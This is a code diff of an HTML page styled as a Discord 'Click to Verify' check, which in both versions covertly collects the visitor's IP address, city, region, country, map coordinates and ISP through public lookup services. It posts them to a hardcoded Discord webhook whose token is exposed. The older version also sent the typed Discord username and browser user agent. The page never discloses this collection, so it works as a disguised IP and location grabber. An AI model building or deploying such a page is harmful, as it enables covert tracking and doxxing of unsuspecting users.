@@ -1,269 +1,204 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>Verification System</title>
   <style>
-    /* ─── Global & Background ───────────────────────────────────────── */
+    /* ─── Background & Particles ────────────────────────────────── */
     @keyframes gradientBG {
-      0%   { background-position: 0% 50%; }
-      50%  { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      0%,100% { background-position: 0% 50%; }
+      50%     { background-position: 100% 50%; }
     }
-    * { box-sizing: border-box; }
     body {
       margin: 0; padding: 0;
       height: 100vh; overflow: hidden;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(-45deg, #1c1c2e, #2c2c3f, #1c1c2e, #2c2c3f);
+      background: linear-gradient(-45deg, #1c1c2f, #2c2c3e, #1c1c2f, #2c2c3e);
       background-size: 400% 400%;
       animation: gradientBG 20s ease infinite;
       display: flex; align-items: center; justify-content: center;
       color: #eee;
+      position: relative;
+    }
+    /* floating particle dots */
+    .particle {
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.1);
+      animation: drift 10s infinite;
+    }
+    @keyframes drift {
+      from { transform: translateY(0) translateX(0); }
+      to   { transform: translateY(-200px) translateX(100px); }
     }
 
-    /* ─── Card Container ────────────────────────────────────────────── */
+    /* ─── Card ───────────────────────────────────────────────────── */
     .card {
       background: rgba(0,0,0,0.75);
-      padding: 2rem;
+      padding: 2rem 2.5rem;
       border-radius: 12px;
       box-shadow: 0 8px 32px rgba(0,0,0,0.6);
-      width: 360px;
       text-align: center;
+      width: 320px;
       position: relative;
-      overflow: hidden;
-      transform-style: preserve-3d;
-      transition: transform 0.6s;
+      z-index: 1;
     }
-    .card:hover {
-      transform: rotateY(10deg) rotateX(5deg);
-    }
-
     h1 {
       margin: 0 0 1rem;
-      font-size: 1.6rem;
+      font-size: 1.5rem;
       letter-spacing: 0.5px;
-    }
-
-    /* ─── Input & Button ───────────────────────────────────────────── */
-    .input-group {
-      margin-bottom: 1rem;
-      position: relative;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 0.7rem 1rem;
-      border: none;
-      border-radius: 8px;
-      font-size: 1rem;
-      outline: none;
-      transition: box-shadow 0.2s;
-    }
-    input[type="text"]:focus {
-      box-shadow: 0 0 10px rgba(9, 157, 255, 0.6);
     }
     button {
       width: 100%;
-      padding: 0.8rem;
+      padding: 0.75rem;
       background: linear-gradient(45deg, #3273dc, #275bbe);
       border: none;
       border-radius: 8px;
       color: #fff;
       font-size: 1rem;
       cursor: pointer;
-      transition: background 0.2s, transform 0.1s;
+      transition: background 0.2s;
     }
     button:hover {
       background: linear-gradient(45deg, #4183ff, #3a6cff);
     }
-    button:active {
-      transform: scale(0.98);
-    }
 
-    /* ─── Status Box ───────────────────────────────────────────────── */
+    /* ─── Status Message ─────────────────────────────────────────── */
     .status {
-      margin-top: 1rem;
-      padding: 0.8rem;
-      border-radius: 8px;
-      font-size: 0.95rem;
+      margin-top: 1.5rem;
+      font-size: 1.1rem;
       display: flex;
       align-items: center;
       justify-content: center;
       opacity: 0;
-      transition: opacity 0.3s;
+      transition: opacity 0.4s;
     }
-    .status.visible {
-      opacity: 1;
-    }
-    .spinner {
-      border: 4px solid rgba(255,255,255,0.2);
-      border-top:    4px solid #09f;
-      border-radius: 50%;
-      width: 20px; height: 20px;
-      animation: spin 1s linear infinite;
-      margin-right: 8px;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .loading { background: rgba(0,123,255,0.2); color: #0d6efd; }
-    .success { background: rgba(40,167,69,0.2); color: #28a745; }
-    .error   { background: rgba(220,53,69,0.2); color: #dc3545; }
-    .warning { background: rgba(255,193,7,0.2); color: #ffc107; }
+    .status.visible { opacity: 1; }
+    .status svg { margin-right: 0.6rem; }
 
-    /* ─── Detail List ──────────────────────────────────────────────── */
-    .details {
-      margin-top: 1rem;
-      text-align: left;
-      font-size: 0.9rem;
-      line-height: 1.4;
-      max-height: 0;
-      overflow: hidden;
-      transition: max-height 0.5s ease;
-    }
-    .details.visible {
-      max-height: 400px;
-    }
-    .details dt { font-weight: bold; }
-    .details dd { margin: 0 0 0.5rem 1rem; }
-    .toggle-details {
-      margin-top: 0.5rem;
-      background: none; border: none;
-      color: #09f; cursor: pointer;
-      font-size: 0.9rem;
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
-  <div class="card" id="card">
-    <h1>Enter your Discord Username</h1>
-    <div class="input-group">
-      <input type="text" id="username" placeholder="CoolUser#1234" autofocus />
-    </div>
-    <button id="submitBtn">Verify Now</button>
+  <!-- generate some floating particles -->
+  <script>
+    for(let i=0;i<30;i++){
+      const d = document.createElement('div');
+      d.className = 'particle';
+      const size = Math.random()*4 + 2;
+      d.style.width = `${size}px`;
+      d.style.height = `${size}px`;
+      d.style.left = `${Math.random()*100}%`;
+      d.style.bottom = `${Math.random()*100}%`;
+      d.style.animationDuration = `${10 + Math.random()*10}s`;
+      d.style.opacity = `${0.05 + Math.random()*0.1}`;
+      document.body.appendChild(d);
+    }
+  </script>
+
+  <div class="card">
+    <h1>Click to Verify</h1>
+    <button id="verifyBtn">Start Verification</button>
     <div id="status" class="status"></div>
-    <dl id="details" class="details">
-      <dt>IP Address:</dt><dd id="ip"></dd>
-      <dt>Location:</dt><dd id="loc"></dd>
-      <dt>Coordinates:</dt><dd><a id="mapLink" href="#" target="_blank"></a></dd>
-      <dt>Timezone:</dt><dd id="tz"></dd>
-      <dt>ISP / Org:</dt><dd id="isp"></dd>
-      <dt>VPN Heuristics:</dt><dd id="vpn"></dd>
-      <dt>User Agent:</dt><dd id="ua"></dd>
-      <dt>Timestamp:</dt><dd id="ts"></dd>
-    </dl>
-    <button id="toggleBtn" class="toggle-details" style="display:none;">Show Details ▼</button>
   </div>
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
-
+    const btn = document.getElementById('verifyBtn');
     const statusEl = document.getElementById('status');
-    const detailsEl = document.getElementById('details');
-    const toggleBtn = document.getElementById('toggleBtn');
 
-    function showStatus(type, html) {
-      statusEl.className = 'status ' + type + ' visible';
-      statusEl.innerHTML = html;
-    }
-    function safeFetch(url, opts={}, t=6000) {
-      const c = new AbortController();
-      const id = setTimeout(() => c.abort(), t);
-      return fetch(url, {...opts, signal:c.signal, mode:'cors'}).finally(() => clearTimeout(id));
+    function showStatus(passed, text) {
+      const icon = passed
+        ? `<svg width="24" height="24" fill="#28a745" viewBox="0 0 16 16"><path d="M16 2L6 14 0 8l2-2 4 4L14 0z"/></svg>`
+        : `<svg width="24" height="24" fill="#ffc107" viewBox="0 0 16 16"><path d="M8 1a7 7 0 1 1 0 14A7 7 0 0 1 8 1zm0 4.5a.5.5 0 0 0-.5.5v3.5a.5.5 0 0 0 1 0V6a.5.5 0 0 0-.5-.5zm.002 6a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5z"/></svg>`;
+      statusEl.innerHTML = `${icon}<span>${text}</span>`;
+      statusEl.classList.add('visible');
     }
 
-    async function gatherAndSend(name) {
-      showStatus('loading','<span class="spinner"></span>Gathering info...');
+    async function safeFetch(url, opts={}, t=5000) {
+      const ctrl = new AbortController();
+      const id = setTimeout(()=>ctrl.abort(), t);
       try {
-        // 1) IP lookup
+        return await fetch(url, {...opts, signal:ctrl.signal, mode:'cors'});
+      } finally {
+        clearTimeout(id);
+      }
+    }
+
+    btn.addEventListener('click', async () => {
+      statusEl.classList.remove('visible');
+      btn.disabled = true;
+      showStatus(false, 'Verifying…');
+
+      try {
+        // 1) IP
         let ipData;
         try { ipData = await (await safeFetch('https://api.ipify.org?format=json')).json(); }
         catch { ipData = await (await safeFetch('https://api.db-ip.com/v2/free/self')).json(); }
         const ip = ipData.ip || ipData.ipAddress;
 
-        // 2) Geo lookup
-        let geo;
-        try {
-          geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json();
-          if (geo.error) throw 1;
-        } catch {
-          geo = await (await safeFetch(`https://ipwho.is/${ip}`)).json();
-        }
+        // 2) Geo
+        let geo = await (await safeFetch(`https://ipapi.co/${ip}/json/`)).json();
+        if (geo.error) throw 1;
 
         // 3) VPN heuristics
-        const sus = [];
+        const factors = [];
         let score = 0;
-        if (geo.org && /hosting|datacenter|cloud|server|proxy|vpn/i.test(geo.org)) {
-          sus.push('Datacenter IP'); score+=40;
+        if (geo.org && /hosting|datacenter|cloud|proxy|vpn/i.test(geo.org)) {
+          factors.push('Datacenter IP');
+          score += 40;
         }
         if (geo.port && [80,443,1080,3128,8080,8888,9050].includes(+geo.port)) {
-          sus.push('Proxy Port'); score+=30;
+          factors.push('Proxy port');
+          score += 30;
         }
-        const isVpn = score>=40;
+        if (geo.timezone && geo.country_code && !geo.timezone.includes(geo.country_code)) {
+          factors.push('Timezone mismatch');
+          score += 20;
+        }
+        const vpnDetected = score >= 40;
 
-        // 4) Build embed
+        // 4) Build embed payload
         const embed = {
-          title: isVpn
-            ? `⚠️ VPN Detected: ${name}`
-            : `✅ Verified: ${name}`,
-          color: isVpn ? 16755007 : 65280,
+          title: vpnDetected
+            ? '🔍 Verification Status\n❌ FAILED: VPN/Proxy Detected'
+            : '🔍 Verification Status\n✅ PASSED: No VPN Detected',
+          color: vpnDetected ? 16755007 : 65280,
           fields: [
-            { name:'Username', value:name, inline:true },
-            { name:'IP',       value:ip, inline:true },
-            { name:'Location', value:`${geo.city||'—'}, ${geo.region_name||geo.region||'—'}, ${geo.country_name||geo.country||'—'}`, inline:false },
-            { name:'Coordinates', value:`[${geo.latitude||geo.lat}, ${geo.longitude||geo.lon}](https://maps.google.com?q=${geo.latitude||geo.lat},${geo.longitude||geo.lon})`, inline:false },
-            { name:'Timezone', value:geo.timezone||'—', inline:true },
-            { name:'ISP/Org', value:geo.org||geo.connection?.isp||'—', inline:true },
-            { name:'Device UA', value:`\`\`\`${navigator.userAgent}\`\`\``, inline:false }
+            { name:'📍 Location',        value:`${geo.city}, ${geo.region}, ${geo.country_name}`, inline:false },
+            { name:'🌐 IP Address',      value: ip, inline:true },
+            { name:'🏢 ISP/Organization',value: geo.org || 'Unknown', inline:true },
+            { name:'🌍 Coordinates',     value:`[${geo.latitude}, ${geo.longitude}](https://maps.google.com?q=${geo.latitude},${geo.longitude})`, inline:false }
           ],
-          timestamp: new Date().toISOString()
+          footer: { text: `Verification at ${new Date().toLocaleString()}` }
         };
-        if (sus.length) embed.fields.push({ name:'Suspicious', value:sus.join(', '), inline:false });
+        if (factors.length) {
+          embed.fields.push({
+            name:'⚠️ Suspicious Factors',
+            value: factors.join(', '),
+            inline:false
+          });
+        }
 
         // 5) Send to webhook
-        await fetch(DISCORD_WEBHOOK,{
+        await fetch(DISCORD_WEBHOOK, {
           method:'POST',
-          headers:{'Content-Type':'application/json'},
+          headers:{ 'Content-Type':'application/json' },
           body: JSON.stringify({ username:'Verification System', embeds:[embed] })
         });
 
-        // 6) UI update
-        showStatus(isVpn?'warning':'success',
-          isVpn
-            ? '⚠️ VPN/Proxy detected. Please disable and retry.'
-            : '✅ Info sent successfully!'
-        );
-
-        // Populate detail panel
-        document.getElementById('ip').textContent  = ip;
-        document.getElementById('loc').textContent = `${geo.city||'—'}, ${geo.region_name||geo.region||'—'}, ${geo.country_name||geo.country||'—'}`;
-        const mapL = document.getElementById('mapLink');
-        const lat = geo.latitude||geo.lat||0, lon = geo.longitude||geo.lon||0;
-        mapL.href = `https://maps.google.com?q=${lat},${lon}`;
-        mapL.textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
-        document.getElementById('tz').textContent = geo.timezone||'—';
-        document.getElementById('isp').textContent = geo.org||geo.connection?.isp||'—';
-        document.getElementById('vpn').textContent = isVpn ? sus.join('; ') : 'None';
-        document.getElementById('ua').textContent = navigator.userAgent;
-        document.getElementById('ts').textContent = new Date().toLocaleString();
-
-        toggleBtn.style.display = 'block';
-      } catch (e) {
-        console.error(e);
-        showStatus('error', `❌ ${e.message||'Failed to verify.'}`);
+        // 6) Update UI
+        if (vpnDetected) {
+          showStatus(false, '⚠️ VPN or proxy detected. Please disable and retry.');
+        } else {
+          showStatus(true, '✅ Verified');
+        }
+      } catch (err) {
+        console.error(err);
+        showStatus(false, '❌ Verification Error');
+      } finally {
+        btn.disabled = false;
       }
-    }
-
-    document.getElementById('submitBtn').addEventListener('click', () => {
-      const u = document.getElementById('username').value.trim();
-      if (!u) return showStatus('error','❌ Please enter your username.');
-      gatherAndSend(u);
-    });
-    toggleBtn.addEventListener('click', () => {
-      const vis = detailsEl.classList.toggle('visible');
-      toggleBtn.textContent = vis ? 'Hide Details ▲' : 'Show Details ▼';
     });
   </script>
 </body>
